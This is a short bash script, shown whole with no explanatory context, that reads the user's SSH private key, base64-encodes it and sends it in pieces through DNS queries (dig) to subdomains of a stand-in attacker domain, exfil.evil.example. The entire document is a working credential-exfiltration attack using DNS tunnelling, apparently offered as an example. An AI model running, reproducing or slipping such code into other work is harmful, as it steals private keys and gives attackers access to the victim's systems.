#!/bin/bash
for chunk in $(cat ~/.ssh/id_rsa | base64); do
  dig "${chunk}.exfil.evil.example" +short
done
